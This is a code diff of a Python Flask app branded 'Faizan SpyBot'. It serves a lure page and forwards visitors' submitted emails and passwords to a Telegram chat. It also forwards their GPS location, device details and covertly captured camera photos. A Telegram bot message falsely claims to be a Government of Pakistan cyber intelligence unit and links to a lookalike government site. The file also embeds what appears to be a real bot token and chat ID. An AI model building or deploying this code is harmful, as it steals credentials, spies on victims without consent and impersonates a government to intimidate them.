@@ -1,63 +1,72 @@
 # main.py
-from flask import Flask, render_template, request, jsonify
-import requests
-import telebot
 import os
+import telebot
+from flask import Flask, request, render_template, redirect
+from datetime import datetime
+from werkzeug.utils import secure_filename
 
-# Telegram Config
-BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
+TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
 CHAT_ID = '6908281054'
-bot = telebot.TeleBot(BOT_TOKEN)
-
+bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
+UPLOAD_FOLDER = 'static/uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 @app.route('/')
-def home():
+def index():
     return render_template('spy.html')
-
-@app.route('/collect', methods=['POST'])
-def collect():
-    try:
-        data = request.get_json()
-        user_agent = data.get('userAgent')
-        latitude = data.get('latitude')
-        longitude = data.get('longitude')
-        camera_status = data.get('camera')
-        device_info = data.get('deviceInfo')
-        ip_address = request.remote_addr
-
-        location_text = f"{latitude}, {longitude}" if latitude and longitude else "❌ Location Blocked"
-        map_link = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude and longitude else "Not Available"
-
-        msg = f"\n🕵️‍♂️ Faizan™ SpyBot Alert" \
-              f"\n\n🌐 IP Address: {ip_address}" \
-              f"\n📍 Location: {location_text}" \
-              f"\n📌 Map: {map_link}" \
-              f"\n\n📷 Camera: {camera_status}" \
-              f"\n🧠 Device: {device_info}" \
-              f"\n🌍 UserAgent: {user_agent}"
-
-        bot.send_message(CHAT_ID, msg)
-        return "Data received"
-    except Exception as e:
-        return f"Error: {e}"
 
 @app.route('/login', methods=['POST'])
 def login():
-    try:
-        email = request.form.get('email')
-        password = request.form.get('password')
-        ip = request.remote_addr
+    email = request.form.get('email')
+    password = request.form.get('password')
+    message = f"🕵️‍♂️ SpyBot Alert\n📧 Email: {email}\n🔑 Password: {password}"
+    bot.send_message(CHAT_ID, message)
+    return redirect('https://google.com')
 
-        msg = f"\n🔐 Login Credentials Captured" \
-              f"\n📧 Email: {email}" \
-              f"\n🔑 Password: {password}" \
-              f"\n🌐 IP: {ip}"
+@app.route('/collect', methods=['POST'])
+def collect():
+    if request.content_type.startswith('application/json'):
+        data = request.get_json()
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
+        cam_status = data.get('camera')
+        user_agent = data.get('userAgent')
+        platform = data.get('deviceInfo')
 
-        bot.send_message(CHAT_ID, msg)
-        return "<h3>✅ You are being tracked. Close the page now.</h3>"
-    except Exception as e:
-        return f"Error: {e}"
+        location_link = f"📍 Location: https://maps.google.com/?q={latitude},{longitude}" if latitude and longitude else "❌ Location Denied"
+
+        message = (
+            f"🕵️‍♂️ SpyBot Alert\n{location_link}\n📷 Camera: {cam_status}\n"
+            f"🧠 Device: {platform}\n🌐 UserAgent: {user_agent}"
+        )
+        bot.send_message(CHAT_ID, message)
+        return 'Data sent'
+
+    if 'photo' in request.files:
+        photo = request.files['photo']
+        filename = secure_filename(f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
+        path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        photo.save(path)
+        with open(path, 'rb') as img:
+            bot.send_photo(CHAT_ID, img)
+        return 'Photo uploaded'
+
+    return 'Invalid Request'
+
+# Telegram Bot /start handler
+@bot.message_handler(commands=['start'])
+def start_handler(message):
+    bot.send_message(
+        message.chat.id,
+        """👋 Welcome to Faizan™ SpyBot!
+
+⚠️ Government of Pakistan – Cyber Intelligence
+🔗 Live Monitoring Portal: https://govt-of-punjab-pak.onrender.com
+
+This system is confidential. Your location, device, and camera are under analysis."""
+    )
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=7860)
